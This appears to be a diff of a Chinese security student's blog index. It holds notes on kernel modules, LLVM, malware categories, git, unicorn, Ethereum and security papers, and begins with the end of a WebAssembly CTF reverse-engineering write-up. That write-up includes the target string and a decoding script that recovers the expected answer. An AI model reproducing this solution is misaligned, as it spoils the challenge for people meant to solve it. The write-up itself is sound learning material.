(stack !== 0) stackRestore(stack);    return ret}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该函数首先调用getCFunc("entry"),getCFunc定义如下：  </p><pre class="line-numbers language-none"><code class="language-none">function getCFunc(ident) {    var func = Module["_" + ident];    assert(func, "Cannot call unknown function " + ident + ", make sure it is exported");    return func}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中Module["_entry"]如下：</p><pre class="line-numbers language-none"><code class="language-none">var _entry = Module["_entry"] = function() {    return (_entry = Module["_entry"] = Module["asm"]["h"]).apply(null, arguments)};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里的<code>Module["asm"]["h"]</code>其实是调用了<code>.wasm</code>中的导出函数，如下：</p><pre class="line-numbers language-none"><code class="language-none">(export "f" (func 27))(export "g" (func 86))(export "h" (func 75))(export "i" (table 0))(export "j" (func 48))(export "k" (func 47))(export "l" (func 46))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即函数<code>check_input</code>中的<code>func</code>实际上指向<code>.wasm</code>文件中的func75(同时也是IDA中的<code>_w2c_h</code>函数，如下)</p><img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/w2c_h.png" class="" title="w2c_h函数"><p>接下来就是将我们的输入存放到内存中，然后去调用func75。</p><p>根据动态调试结果，func28返回输入的长度。</p><img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/%E9%95%BF%E5%BA%A6%E9%AA%8C%E8%AF%81.png" class="">    <p>func45验证输入正确与否(一堆跳转，一看就是字符串比对,目标字符串为数据段中的"0077678b0f3e6cf6e263e6fe3a4c39f3")。</p><img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/func45.png" class=""><p>函数返回非0则调用f29(1085),否则调用f29(1077)。其中1077指向的数据为"sucess",f29为输出函数，它调用了函数$a.b.<br>那么前面的func28之后一定还有对输入进行加密的逻辑。调试中发现，加密后的输出被存放的内存偏移为func75中早就定义好的全局变量<code>w2c_g0</code>。</p><img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/func81.png" class="">  <img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/moutput.png" class="">  <p>更改几次输入很容易发现规律,例如:我们的输入为"123",则输出为:</p><p>$$((128*ord('1'))+ord('2'))*128+ord('3')$$</p><p>解密脚本:</p><pre class="line-numbers language-none"><code class="language-none">bigNum = int("0077678b0f3e6cf6e263e6fe3a4c39f3",16)res = []while bigNum != 0:    res.append(bigNum%128)    bigNum = bigNum &gt;&gt; 7print(''.join([chr(i) for i in res[::-1]]))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="6-参考文章"><a href="#6-参考文章" class="headerlink" title="6. 参考文章"></a>6. 参考文章</h1><ol><li><a href="https://xz.aliyun.com/t/5170">一种Wasm逆向静态分析方法</a></li><li><a href="https://juejin.cn/post/6844904077411745800#heading-4">Wasm介绍之4：函数调用</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/WebAssembly/Understanding_the_text_format">理解WebAssembly文本格式</a></li></ol><h1 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h1><a href="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/calc.7z" title="calc.7z">calc.7z</a>]]></content>
-      
-      
+      <tags>
+        <tag>kernel-pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux驱动模块编写</title>
+    <url>/2021/05/12/linux-qu-dong-mo-kuai-bian-xie/</url>
+    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h1><blockquote>
+<p>Linux系统分为内核态和用户态，只有内核态才有访问硬件设备的权限。驱动实际上是内核态提供给用户态访问硬件设备的API。</p>
+</blockquote>
+<h1 id="1-demo——以HelloWorld为例"><a href="#1-demo——以HelloWorld为例" class="headerlink" title="1. demo——以HelloWorld为例"></a>1. demo——以HelloWorld为例</h1><h2 id="1-1-驱动模块代码的组成"><a href="#1-1-驱动模块代码的组成" class="headerlink" title="1.1. 驱动模块代码的组成"></a>1.1. 驱动模块代码的组成</h2><ol>
+<li>头文件</li>
+<li>模块装载函数和卸载函数的<strong>实现</strong></li>
+<li>模块装载函数和卸载函数的<strong>声明</strong></li>
+<li>其它信息，例如协议、作者等</li>
+</ol>
+<h2 id="1-2-驱动代码"><a href="#1-2-驱动代码" class="headerlink" title="1.2. 驱动代码"></a>1.2. 驱动代码</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">//hello_drv.c
+#include &lt;linux/module.h&gt;
+#include &lt;linux/init.h&gt;
+
+// GPL and author
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("XXX");
+
+// install module
+static int __init hello_drv_init(void)
+{
+    printk("--------------install hello_drv--------------\n");
+    return 0;
+}
+
+// uninstall module
+// NOTE：uninstall function do not have return value
+static void __exit hello_drv_exit(void)
+{
+    printk("--------------uninstall hello_drv--------------\n");
+}
+
+// declaration
+module_init(hello_drv_init);
+module_exit(hello_drv_exit);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>题外话，复习一下static关键词，面试有被问到，不会......<br>  被static修饰的函数仅在当前文件内可以使用<br>  被static修饰的变量会被默认初始化为0(且程序逆运行过程中只初始化1次)，它的可见范围也仅限于当前文件</p>
+</blockquote>
+<h2 id="1-3-Makefile"><a href="#1-3-Makefile" class="headerlink" title="1.3. Makefile"></a>1.3. Makefile</h2><pre class="line-numbers language-none"><code class="language-none">CUR_DIR := $(shell pwd)     #驱动代码所在目录
+ROOTFS_DIR := ..            #文件系统根目录
+KERNEL_DIR := ../../../linux-5.4.5  #内核源码所在目录
+
+ifeq ($(KERNELRELEASE),)
+
+all:
+	make -C $(KERNEL_DIR) M=$(CUR_DIR) modules
+clean:
+	make -C $(KERNEL_DIR) M=$(CUR_DIR) clean
+install:
+	cp -raf *.ko $(ROOTFS_DIR)/drv_module
+
+else
+	obj-m += hello_drv.o
+
+endif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Make过程描述：<br>第一次执行make时，KERNELRELEASE还没有被定义，所以执行<strong>伪目标</strong>all。make -C指定内核所在目录，当执行到这里的时候KERNELRELEASE就被定义了。M=$(CUR_DIR)即在当前目录下编译文件为模块，但是此时不知道编译哪个文件为模块。之后再次执行make，此时因为KERNELRELEASE已经被定义，执行else中的内容，将hello_drv.c编译成hello_drv.o并链接成hello_drv.ko。</p>
+<h2 id="1-4-安装"><a href="#1-4-安装" class="headerlink" title="1.4. 安装"></a>1.4. 安装</h2><pre class="line-numbers language-none"><code class="language-none">lsmod:查看当前安装的驱动模块
+insmod:安装驱动模块 #在安装自己写的驱动的时候，有可能会报taints kernel的信息。
+                #这个不用管，因为我们自己写的模块不在内核的代码树里
+rmmod:删除驱动模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<img src="/2021/05/12/linux-qu-dong-mo-kuai-bian-xie/%E5%AE%89%E8%A3%85%E9%A9%B1%E5%8A%A8.png" class="">
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
+<li><a href="https://paper.seebug.org/779/">从 0 开始学 Linux 驱动开发(一)</a></li>
+<li><a href="https://blog.csdn.net/fenglang1233307/article/details/79677590">简单的linux驱动模块编写</a></li>
+</ol>
+]]></content>
       <categories>
-          
-          <category> 逆向工程 </category>
-          
+        <category>linux</category>
+        <category>驱动</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> wasm </tag>
-            
-            <tag> writeup </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-  
-  
+      <tags>
+        <tag>驱动</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LLVM</title>
+    <url>/2021/05/13/llvm/</url>
+    <content><![CDATA[<h1 id="各类Pass"><a href="#各类Pass" class="headerlink" title="各类Pass"></a>各类Pass</h1><ul>
+<li>ModulePass 以整个程序作为输入单元</li>
+<li>FunctionPass  对函数进行操作</li>
+</ul>
+<h1 id="IR"><a href="#IR" class="headerlink" title="IR"></a>IR</h1><h2 id="宏定义中的函数调用"><a href="#宏定义中的函数调用" class="headerlink" title="宏定义中的函数调用"></a>宏定义中的函数调用</h2><p>Example:</p>
+<pre class="line-numbers language-none"><code class="language-none">#define MACRO_FUNC(a) func(a);
+void func(int a){a = 1;}
+
+int main(){
+    int b = 0;
+    MACRO_FUNC(b);
+    return 0;
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="API"><a href="#API" class="headerlink" title="API"></a>API</h1><h2 id="uses和user方法的区别？"><a href="#uses和user方法的区别？" class="headerlink" title="uses和user方法的区别？"></a>uses和user方法的区别？</h2><h2 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h2><blockquote>
+<p>函数层API</p>
+</blockquote>
+<h3 id="methods"><a href="#methods" class="headerlink" title="methods"></a>methods</h3><ul>
+<li>isIntrinsic 判断函数是否为llvm内置函数，即函数名以"llvm."开头</li>
+<li>isDeclaration 判断该函数是否已经被定义，如果已经被定义返回True</li>
+</ul>
+<h2 id="Instruction"><a href="#Instruction" class="headerlink" title="Instruction"></a>Instruction</h2><blockquote>
+<p>指令类</p>
+</blockquote>
+<h3 id="methods-1"><a href="#methods-1" class="headerlink" title="methods"></a>methods</h3><ul>
+<li><p>getMetadata<br>  Example：</p>
+<pre><code class="C">getMetadata("dbg")     //如果编译的时候保留了DEBUG信息，可以通过这个方法，获取和这条指令相关的DEBUG信息
+//返回MDNode(Metadata Node)类对象
+
+//demo
+DILocation *getSourceLocation(Instruction *I) {
+if (!I)
+    return NULL;
+
+MDNode *N = I-&gt;getMetadata("dbg");
+if (!N)
+    return NULL;
+
+DILocation *Loc = dyn_cast&lt;DILocation&gt;(N);
+if (!Loc || Loc-&gt;getLine() &lt; 1)
+        return NULL;
+
+    return Loc;
+}
+</code></pre>
+</li>
+</ul>
+<h3 id="subclass"><a href="#subclass" class="headerlink" title="subclass"></a>subclass</h3><ul>
+<li>CmpInst<ul>
+<li>ICmpInst</li>
+<li>FCmpInst</li>
+</ul>
+</li>
+<li>CallBase 所有调用指令的基类</li>
+</ul>
+<h2 id="DILocation"><a href="#DILocation" class="headerlink" title="DILocation"></a>DILocation</h2><blockquote>
+<p>DEBUG Locatiion</p>
+</blockquote>
+<h3 id="methods-2"><a href="#methods-2" class="headerlink" title="methods"></a>methods</h3><ul>
+<li>getLine<br>  获取需要DEBUG的代码所在的行数</li>
+<li>getFileName<br>  获取需要DEBUG的代码所在的文件</li>
+</ul>
+<h1 id="icall收集中遇到的问题"><a href="#icall收集中遇到的问题" class="headerlink" title="icall收集中遇到的问题"></a>icall收集中遇到的问题</h1><ul>
+<li>有些Address-Taken Func可能就是在直接调用中被调用的，并不会成为非直接调用的目标<img src="/2021/05/13/llvm/icall%E9%97%AE%E9%A2%981.png" class=""> </li>
+</ul>
+]]></content>
+      <categories>
+        <category>静态分析</category>
+        <category>LLVM学习笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>常见二进制木马及病毒原理</title>
+    <url>/2021/05/31/chang-jian-er-jin-zhi-mu-ma-ji-bing-du-yuan-li/</url>
+    <content><![CDATA[<blockquote>
+<p>草稿</p>
+</blockquote>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="病毒"><a href="#病毒" class="headerlink" title="病毒"></a>病毒</h2><ul>
+<li>需要宿主-&gt;可执行文件</li>
+<li>被感染文件运行-&gt;病毒传播</li>
+<li>最常见类型：宏病毒？</li>
+</ul>
+<h2 id="木马-Trojan-Horse"><a href="#木马-Trojan-Horse" class="headerlink" title="木马(Trojan Horse)"></a>木马(Trojan Horse)</h2><ul>
+<li>单个文件？</li>
+<li>攻击者借助木马远程连接</li>
+</ul>
+<h2 id="蠕虫-worm"><a href="#蠕虫-worm" class="headerlink" title="蠕虫(worm)"></a>蠕虫(worm)</h2><ul>
+<li>单个文件，没有主程序？指数定律增长？</li>
+<li>分类<ul>
+<li>带载荷：包含其它特定任务，例如在计算机上安装其它后门程序<ul>
+<li> 逻辑炸弹(嵌入在正常软件中并在特定情况下执行的恶意程式码,通常是破坏计算机数据，造成主机宕机等)</li>
+</ul>
+</li>
+<li>无载荷：除了消耗带宽，没有其他明显影响</li>
+</ul>
+</li>
+<li>通常需要依靠操作系统的安全漏洞</li>
+<li>攻击流程<ul>
+<li>目标选择</li>
+<li>扫描</li>
+<li>入侵</li>
+<li>传播</li>
+<li>攻击载荷</li>
+</ul>
+</li>
+<li>影响</li>
+<li>案例分析<ul>
+<li>冲击波蠕虫        <ul>
+<li>是否可以通过伪造无害的变体来防御攻击？</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h2><ul>
+<li>一组文件</li>
+<li>完全管理员权限</li>
+<li>感染后难以解决：比如说rootkit可能驻留在内核中，因为内核通常需要重装操作系统</li>
+</ul>
+<h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><ul>
+<li>绕过安全防护机制</li>
+<li>可以是软件、硬件甚至是算法(类似于密码算法中的陷门？)</li>
+</ul>
+<h1 id="病毒-1"><a href="#病毒-1" class="headerlink" title="病毒"></a>病毒</h1><h1 id="蠕虫"><a href="#蠕虫" class="headerlink" title="蠕虫"></a>蠕虫</h1><img src="/2021/05/31/chang-jian-er-jin-zhi-mu-ma-ji-bing-du-yuan-li/%E7%97%85%E6%AF%92%E4%B8%8E%E8%A0%95%E8%99%AB%E7%9A%84%E5%8C%BA%E5%88%AB.png" class="" title="蠕虫与病毒的区别">
+<h2 id="发展趋势"><a href="#发展趋势" class="headerlink" title="发展趋势"></a>发展趋势</h2><ol>
+<li>与病毒技术结合</li>
+<li>多平台</li>
+<li>物联网</li>
+<li>隐身能力↑</li>
+</ol>
+]]></content>
+      <categories>
+        <category>网络安全基础知识</category>
+      </categories>
+      <tags>
+        <tag>木马</tag>
+        <tag>病毒</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>git</title>
+    <url>/2021/06/07/git/</url>
+    <content><![CDATA[<h1 id="reset"><a href="#reset" class="headerlink" title="reset"></a>reset</h1><h2 id="恢复到上个状态"><a href="#恢复到上个状态" class="headerlink" title="恢复到上个状态"></a>恢复到上个状态</h2><pre class="line-numbers language-none"><code class="language-none">git reset --hard &lt;log SHA&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h1 id="pull-push"><a href="#pull-push" class="headerlink" title="pull/push"></a>pull/push</h1><h2 id="拉取仓库"><a href="#拉取仓库" class="headerlink" title="拉取仓库"></a>拉取仓库</h2><pre class="line-numbers language-none"><code class="language-none">git pull origin remote-branch:local-branch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h1 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h1><pre class="line-numbers language-none"><code class="language-none"># 将XXX分支合并到当前分支
+git merge xxx <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h1><h2 id="Permission-denied-PublicKey"><a href="#Permission-denied-PublicKey" class="headerlink" title="Permission denied(PublicKey)"></a>Permission denied(PublicKey)</h2><p>产生原因：<br>之前配置的ssh key过期了     </p>
+<p>解决方案(Linux OS)：<br>ssh-keygen<br>cat ~/.ssg/id_rsa.pub<br>复制其中的内容<br>登录github账号<br>选择settings/SSH &amp; GPG Keys 创建新的SSH key</p>
+]]></content>
+      <categories>
+        <category>git</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>unicorn</title>
+    <url>/2021/06/16/unicorn/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>unicorn是一款基于qemu编写的逆向工程引擎，它可以模拟执行不同架构的二进制代码</p>
+</blockquote>
+<h1 id="安装方式"><a href="#安装方式" class="headerlink" title="安装方式"></a>安装方式</h1><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><h3 id="快速安装"><a href="#快速安装" class="headerlink" title="快速安装"></a>快速安装</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">pip install unicorn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="C"><a href="#C" class="headerlink" title="C"></a>C</h2><blockquote>
+<p>源码编译</p>
+</blockquote>
+<h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><blockquote>
+<p>以python为例</p>
+</blockquote>
+<h2 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h2><blockquote>
+<p>利用pwntool将asm转换成机器码</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">from pwn import *
+
+# code to be emulated
+context(log_level="info",arch="amd64",os="linux")
+shellcode = asm("mov eax,0")
+print(shellcode)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+]]></content>
+      <categories>
+        <category>逆向工程</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>区块链</title>
+    <url>/2021/06/28/qu-kuai-lian/</url>
+    <content><![CDATA[<h1 id="BTC"><a href="#BTC" class="headerlink" title="BTC"></a>BTC</h1><blockquote>
+<p>区块链1.0</p>
+</blockquote>
+<ul>
+<li>去中心化有什么优势？<ul>
+<li>流通性↑</li>
+</ul>
+</li>
+</ul>
+<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><blockquote>
+<p>Hash指针，其实就是用Hash值表示key</p>
+</blockquote>
+<h3 id="Merkle-Tree"><a href="#Merkle-Tree" class="headerlink" title="Merkle Tree"></a>Merkle Tree</h3><h1 id="Ethereum"><a href="#Ethereum" class="headerlink" title="Ethereum"></a>Ethereum</h1><blockquote>
+<p>工作量证明-&gt;权益证明<br>区块链2.0<br><strong>支持智能合约</strong>,以此实现一些金融衍生品<br>可以看成，交易驱动的状态机</p>
+</blockquote>
+<h2 id="ETH-账户"><a href="#ETH-账户" class="headerlink" title="ETH-账户"></a>ETH-账户</h2><blockquote>
+<p>BTC的余额在UTXO中，交易时需要证明币的来源<br>BTC余额处理很反人类</p>
+</blockquote>
+<p>ETH基于账户</p>
+<blockquote>
+<p>交易时不需要证明的来源<br>余额直接放在账户上      </p>
+</blockquote>
+<ul>
+<li>优势<ul>
+<li>天然防御double spending attack(花两次，花钱的人不诚实)<br>余额保存在账户中，花两次也钱会少两次</li>
+</ul>
+</li>
+<li>劣势</li>
+<li>讨论<ul>
+<li>篡改余额  余额由全节点维护，无法私自篡改</li>
+<li>如何防御replay attack(收两次，收钱的人不诚实)<br>交易信息中加入nonce(交易的次数，nonce值是被签名的，无法被其他人篡改)</li>
+</ul>
+</li>
+</ul>
+<h3 id="外部账户"><a href="#外部账户" class="headerlink" title="外部账户"></a>外部账户</h3><blockquote>
+<p>balance、nonce<br>可以主动发起交易</p>
+</blockquote>
+<h3 id="合约账户"><a href="#合约账户" class="headerlink" title="合约账户"></a>合约账户</h3><blockquote>
+<p>balance、nonce、code、storage<br>不能主动发起交易</p>
+</blockquote>
+<h2 id="状态树"><a href="#状态树" class="headerlink" title="状态树"></a>状态树</h2><blockquote>
+<p>地址→账户状态的映射<br>MPT(Merkle Paatricia Trie)</p>
+</blockquote>
+<h3 id="trie"><a href="#trie" class="headerlink" title="trie"></a>trie</h3><blockquote>
+<p>字典树</p>
+</blockquote>
+<ul>
+<li>优势<ul>
+<li>ETH中的查找深度都是40</li>
+<li>只要值不同，就不存在冲突</li>
+<li>不同的结点无论按照何种顺序插入，最后的结构都是相同</li>
+<li>更新操作具有良好的局部性</li>
+</ul>
+</li>
+<li>劣势<ul>
+<li>存储上存在浪费→压缩存储→Patricia trie<ul>
+<li>为什么要使用Patricia trie？<br>  以太坊中的账户非常稀疏    </li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<img src="/2021/06/28/qu-kuai-lian/patricia_trie.png" class="">
+
+<h3 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h3><ul>
+<li>Hash Table如何提供Merkle Proof？<ul>
+<li>数量级太大，构建merkle tree的代价太大</li>
+</ul>
+</li>
+<li>不排序的Merkle Tree是不行的</li>
+<li>排序的Merkle Tree会遇到什么问题？   <ul>
+<li>插入代价大</li>
+</ul>
+</li>
+<li>以太坊中的账户为什么要设计得很长？<ul>
+<li>避免碰撞</li>
+</ul>
+</li>
+<li>为什么要保存历史状态？<ul>
+<li>因为ETH是支持智能合约的，不像BTC可以按照交易内容很容易的推出之前的交易状态，所以，为了支持回滚，ETH需要保存历史状态。</li>
+</ul>
+</li>
+</ul>
+<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><ul>
+<li>genesis block创世纪块</li>
+</ul>
+<h2 id="交易树与收据树"><a href="#交易树与收据树" class="headerlink" title="交易树与收据树"></a>交易树与收据树</h2><blockquote>
+<p>MPT</p>
+</blockquote>
+<h3 id="bloom-filter"><a href="#bloom-filter" class="headerlink" title="bloom filter"></a>bloom filter</h3><blockquote>
+<p>digest→vec<br>no false-nagative<br>false-positive→不支持删除操作</p>
+</blockquote>
+<h3 id="讨论-1"><a href="#讨论-1" class="headerlink" title="讨论"></a>讨论</h3><ul>
+<li>为什么状态树要保存所有账户的状态？而不能只保存交易账户的状态？<ul>
+<li>查找账户状态难，如果交易中的1个账户是新建立的账户，需要一直查找到创世纪块。</li>
+</ul>
+</li>
+</ul>
+<h2 id="共识机制"><a href="#共识机制" class="headerlink" title="共识机制"></a>共识机制</h2><blockquote>
+<p>GHOST协议<br>Centralization bias<br>uncle block，包含叔父区块可以得到额外的出块奖励，叔父区块自身页可以拿到出块奖励</p>
+</blockquote>
+<h3 id="讨论-2"><a href="#讨论-2" class="headerlink" title="讨论"></a>讨论</h3><ul>
+<li>叔父区块过多怎么办？</li>
+<li>故意不包含某些叔父区块？<ul>
+<li>损人不利己，但是自己损失较小</li>
+<li>解决方法：叔父的辈分不仅仅只有一代</li>
+</ul>
+</li>
+</ul>
+<h2 id="挖矿算法"><a href="#挖矿算法" class="headerlink" title="挖矿算法"></a>挖矿算法</h2><h3 id="难度调整"><a href="#难度调整" class="headerlink" title="难度调整"></a>难度调整</h3><h4 id="难度炸弹"><a href="#难度炸弹" class="headerlink" title="难度炸弹"></a>难度炸弹</h4><h2 id="权益证明"><a href="#权益证明" class="headerlink" title="权益证明"></a>权益证明</h2><blockquote>
+<p>工作量证明造成资源浪费？</p>
+</blockquote>
+<h2 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h2><blockquote>
+<p>去中心化的合同<br>solidity</p>
+</blockquote>
+<p>以太坊中只有外部账户能发起交易，合约交易不能主动发起交易</p>
+<blockquote>
+<p>合约的调用方法：</p>
+<ol>
+<li>间接调用：call和delegatecall(在当前合约环境下执行)</li>
+<li>直接调用</li>
+</ol>
+</blockquote>
+<h3 id="gas-fee"><a href="#gas-fee" class="headerlink" title="gas fee"></a>gas fee</h3><p>以太坊中的交易具有原子性，要么完全执行，要么完全不执行。<br>执行失败以后，状态回滚，但是gas fee不退。(防止DOS)</p>
+<h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><h3 id="TheDAO"><a href="#TheDAO" class="headerlink" title="TheDAO"></a>TheDAO</h3><p>重入攻击：同一部分代码被反复执行？</p>
+<h3 id="Beauty-Chain"><a href="#Beauty-Chain" class="headerlink" title="Beauty Chain"></a>Beauty Chain</h3><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><ul>
+<li>智能合约真的智能嘛？<ul>
+<li>smart contract is anything but smart</li>
+</ul>
+</li>
+<li>不可篡改性其实是1个双刃剑</li>
+<li>Nothing is irrevocable.</li>
+<li>solidity 这个语言是否有问题？ <ul>
+<li>解决思路:模板</li>
+</ul>
+</li>
+<li>去中心化意味着什么？<ul>
+<li>分叉是民主的体现</li>
+</ul>
+</li>
+<li>去中心化≠分布式<h3 id="讨论-3"><a href="#讨论-3" class="headerlink" title="讨论"></a>讨论</h3></li>
+<li>全节点先挖矿还是先执行合约？<ul>
+<li>执行过程中状态变化都在本地(本地维护了1个状态树)，执行完以后发布才达成共识</li>
+<li>必须先执行，因为blocker header中包含三棵树的根hash值，而挖矿的nonce是要根据blocker header来计算的，所以要先执行合约再挖矿</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>区块链</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Automatically Detecting Error Handling Bugs Using Error Specifications</title>
+    <url>/2021/07/13/automatically-detecting-error-handling-bugs-using-error-specifications/</url>
+    <content><![CDATA[<h1 id="1-阅读笔记"><a href="#1-阅读笔记" class="headerlink" title="1. 阅读笔记"></a>1. 阅读笔记</h1><h2 id="1-1-论文目标"><a href="#1-1-论文目标" class="headerlink" title="1.1. 论文目标"></a>1.1. 论文目标</h2><p>检测<strong>C程序</strong>中不当错误处理导致的Bug</p>
+<h2 id="1-2-关键问题与解决方法"><a href="#1-2-关键问题与解决方法" class="headerlink" title="1.2. 关键问题与解决方法"></a>1.2. 关键问题与解决方法</h2><ol>
+<li>识别错误路径<ul>
+<li>归纳错误模式→错误返回代码</li>
+</ul>
+</li>
+<li>归纳错误处理方法<ul>
+<li>upstream return</li>
+<li>exit</li>
+<li>log</li>
+</ul>
+</li>
+<li>定位BUG位置<ul>
+<li>交叉检查，只能确定是否报告漏洞，但是不知道如何报告漏洞</li>
+</ul>
+</li>
+</ol>
+<h2 id="1-4-Future-work"><a href="#1-4-Future-work" class="headerlink" title="1.4. Future work"></a>1.4. Future work</h2><ol>
+<li>自动识别错误处理模式</li>
+<li>自动生成Bug补丁</li>
+</ol>
+<h1 id="2-Cite"><a href="#2-Cite" class="headerlink" title="2. Cite"></a>2. Cite</h1><h2 id="2-1-BibTex"><a href="#2-1-BibTex" class="headerlink" title="2.1. BibTex"></a>2.1. BibTex</h2><p>@inproceedings{jana2016automatically,<br>  title={Automatically detecting error handling bugs using error specifications},<br>  author={Jana, Suman and Kang, Yuan Jochen and Roth, Samuel and Ray, Baishakhi},<br>  booktitle={25th ${$USENIX$}$ Security Symposium (${$USENIX$}$ Security 16)},<br>  pages={345--362},<br>  year={2016}<br>}</p>
+]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+      <tags>
+        <tag>bug detect</tag>
+        <tag>error hanlde</tag>
+        <tag>static analysis</tag>
+        <tag>usenix</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>All You Ever Wanted to Know about Dynamic Taint Analysis and Forward Symbolic Execution</title>
+    <url>/2021/07/13/all-you-ever-wanted-to-know-about-dynamic-taint-analysis-and-forward-symbolic-execution/</url>
+    <content><![CDATA[<h1 id="1-阅读笔记"><a href="#1-阅读笔记" class="headerlink" title="1. 阅读笔记"></a>1. 阅读笔记</h1><blockquote>
+<p>文章速览：  </p>
+<ol>
+<li>构建了一种新的中间语言 </li>
+<li>动态污点分析</li>
+<li>符号执行</li>
+</ol>
+</blockquote>
+<blockquote>
+<p>重要观点：</p>
+<ul>
+<li>动态分析的优点<ol>
+<li>结果准确</li>
+<li>简单,只需考虑一次执行过程中发生的事情</li>
+</ol>
+</li>
+<li>动态污点分析+符号执行的应用<ol>
+<li>未知漏洞挖掘</li>
+<li>自动化过滤输入</li>
+<li>测试用例生成</li>
+<li>恶意代码分析</li>
+</ol>
+</li>
+</ul>
+</blockquote>
+<h2 id="1-1-动态污点分析"><a href="#1-1-动态污点分析" class="headerlink" title="1.1. 动态污点分析"></a>1.1. 动态污点分析</h2><blockquote>
+<p>动态追踪source和sink</p>
+</blockquote>
+<ul>
+<li>两个挑战:overtainted和undertainting</li>
+<li>内容速览<ol>
+<li>如何执行动态符号执行?<ul>
+<li>根据操作语义的规则</li>
+</ul>
+</li>
+<li>污点策略<ul>
+<li>introduction</li>
+<li>transport</li>
+<li>check</li>
+</ul>
+</li>
+<li>注意事项:哪些容易产生overtainted或undertainting?<ul>
+<li>decide when to remove a taint is more difficult than when to introduce a taint</li>
+<li>undertainting ?</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>重要观点: 不同目标应用的污点策略不同,但是大同小异</li>
+</ul>
+<h2 id="1-2-符号执行"><a href="#1-2-符号执行" class="headerlink" title="1.2. 符号执行"></a>1.2. 符号执行</h2><blockquote>
+<p>一个公式对应一条路径</p>
+</blockquote>
+<ul>
+<li>三个难题<ol>
+<li>Symbolic Memory<ul>
+<li>解决方案<ol>
+<li>unsound assumptions<br> 将如下代码: <pre class="line-numbers language-none"><code class="language-none">store(addr1, v)
+z = load(addr2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
